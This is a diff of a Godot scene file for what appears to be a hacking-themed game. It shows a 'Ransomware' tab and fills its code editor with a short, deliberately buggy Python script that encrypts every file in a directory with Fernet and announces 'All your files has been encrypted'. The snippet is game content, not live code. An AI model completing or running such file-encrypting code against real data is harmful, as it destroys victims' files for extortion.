@@ -1,9 +1,9 @@
-[gd_scene load_steps=7 format=3 uid="uid://clngoai2te04p"]
+[gd_scene load_steps=7 format=3 uid="uid://ctd13mbtkg4w"]
 
-[ext_resource type="Script" uid="uid://bee4l3skdbucv" path="res://Scripts/GUI/pc_gui_joshua.gd" id="1_wwpmy"]
-[ext_resource type="PackedScene" uid="uid://cnlake8o686ww" path="res://Scenes/gui/CleanUI/icon.tscn" id="1_yoj7b"]
-[ext_resource type="Script" uid="uid://bqyk03rse0met" path="res://Scripts/GUI/clean_ui_ransomware.gd" id="3_rtgtv"]
-[ext_resource type="Script" uid="uid://cpwr37ebspmj0" path="res://addons/RadialMenu/RadialMenu.gd" id="3_w5pg6"]
+[ext_resource type="Script" uid="uid://bee4l3skdbucv" path="res://Scripts/GUI/pc_gui_joshua.gd" id="1_je1oo"]
+[ext_resource type="PackedScene" uid="uid://cnlake8o686ww" path="res://Scenes/gui/CleanUI/icon.tscn" id="2_tp4eq"]
+[ext_resource type="Script" uid="uid://cpwr37ebspmj0" path="res://addons/RadialMenu/RadialMenu.gd" id="3_8m0dg"]
+[ext_resource type="Script" uid="uid://bqyk03rse0met" path="res://Scripts/GUI/clean_ui_ransomware.gd" id="4_tmtoj"]
 
 [sub_resource type="Shader" id="Shader_wwpmy"]
 code = "shader_type canvas_item;
@@ -37,8 +37,8 @@ void fragment() {
 [sub_resource type="ShaderMaterial" id="ShaderMaterial_rtgtv"]
 shader = SubResource("Shader_wwpmy")
 shader_parameter/rect_color = Color(0, 0, 0, 0.505882)
-shader_parameter/hole_position = Vector2(0.115, 0.045)
-shader_parameter/hole_size = Vector2(1.765, 0.29)
+shader_parameter/hole_position = Vector2(0.115, 0.055)
+shader_parameter/hole_size = Vector2(3.495, 0.215)
 
 [node name="ComputerGUI" type="TabContainer"]
 anchors_preset = 15
@@ -46,11 +46,12 @@ anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-current_tab = 0
+current_tab = 1
 tabs_visible = false
-script = ExtResource("1_wwpmy")
+script = ExtResource("1_je1oo")
 
 [node name="Margin" type="MarginContainer" parent="."]
+visible = false
 layout_mode = 2
 theme_override_constants/margin_left = 95
 theme_override_constants/margin_top = 95
@@ -63,25 +64,25 @@ custom_minimum_size = Vector2(1152, 648)
 layout_mode = 2
 theme_override_constants/h_separation = 20
 
-[node name="Icon" parent="Margin/Desktop" instance=ExtResource("1_yoj7b")]
+[node name="Icon" parent="Margin/Desktop" instance=ExtResource("2_tp4eq")]
 layout_mode = 2
 
 [node name="Label" parent="Margin/Desktop/Icon" index="1"]
 text = "PDF"
 
-[node name="Icon2" parent="Margin/Desktop" instance=ExtResource("1_yoj7b")]
+[node name="Icon2" parent="Margin/Desktop" instance=ExtResource("2_tp4eq")]
 layout_mode = 2
 
-[node name="Icon3" parent="Margin/Desktop" instance=ExtResource("1_yoj7b")]
+[node name="Icon3" parent="Margin/Desktop" instance=ExtResource("2_tp4eq")]
 layout_mode = 2
 
 [node name="Label" parent="Margin/Desktop/Icon3" index="1"]
 text = "PNG"
 
-[node name="Icon4" parent="Margin/Desktop" instance=ExtResource("1_yoj7b")]
+[node name="Icon4" parent="Margin/Desktop" instance=ExtResource("2_tp4eq")]
 layout_mode = 2
 
-[node name="Icon5" parent="Margin/Desktop" instance=ExtResource("1_yoj7b")]
+[node name="Icon5" parent="Margin/Desktop" instance=ExtResource("2_tp4eq")]
 layout_mode = 2
 
 [node name="RadialMenu" type="Control" parent="Margin/Desktop"]
@@ -90,23 +91,45 @@ custom_minimum_size = Vector2(300, 222.263)
 layout_mode = 2
 size_flags_horizontal = 0
 size_flags_vertical = 0
-script = ExtResource("3_w5pg6")
+script = ExtResource("3_8m0dg")
 
 [node name="Ransomware" type="MarginContainer" parent="."]
-visible = false
 layout_mode = 2
 theme_override_constants/margin_left = 75
 theme_override_constants/margin_top = 75
 theme_override_constants/margin_right = 75
 theme_override_constants/margin_bottom = 75
-script = ExtResource("3_rtgtv")
+script = ExtResource("4_tmtoj")
 metadata/_tab_index = 1
 
 [node name="CodeEdit" type="CodeEdit" parent="Ransomware"]
 custom_minimum_size = Vector2(1300, 0)
 layout_mode = 2
 size_flags_horizontal = 0
-theme_override_font_sizes/font_size = 42
+theme_override_font_sizes/font_size = 33
+text = "import os
+from cryptography.fernet import fernet
+
+allfiles = [ ]
+for file in os.listdir (  )  : 
+        if file == \"malware\"  or  file  ==  \"key.key\"  or  file ==  \"decry\" :   
+                  continue
+        if os.path.isfile (file) :  allfiles.append (file)
+
+print (allfiles)
+
+key  =  Fernet.generate_key ( )
+with open (\"key.key\",  \"wb\")  as  thekey : 
+        thekey.write (key)
+
+for file in allfiles: 
+        with open (file, \"rb\")  as thefile: 
+                   content  = thefeli.read( ) 
+        content_encr  = Fernet (key) .encrypt ( content ) 
+        with  open (file, \"wb\")  as the file; 
+                   thefile.write(content_encr) 
+
+print (\"All your  files has been encrypted\")"
 gutters_draw_breakpoints_gutter = true
 gutters_draw_bookmarks = true
 gutters_draw_executing_lines = true
@@ -114,6 +137,7 @@ gutters_draw_line_numbers = true
 gutters_zero_pad_line_numbers = true
 
 [node name="Overlay" type="ColorRect" parent="Ransomware/CodeEdit"]
+visible = false
 material = SubResource("ShaderMaterial_rtgtv")
 custom_minimum_size = Vector2(1080, 0)
 layout_mode = 1
@@ -137,7 +161,6 @@ texture_filter = 1
 layout_mode = 2
 size_flags_horizontal = 3
 theme_override_font_sizes/normal_font_size = 33
-text = "Create the code for the good shit"
 fit_content = true
 
 [node name="Spacing" type="Panel" parent="Ransomware/HFlowContainer"]
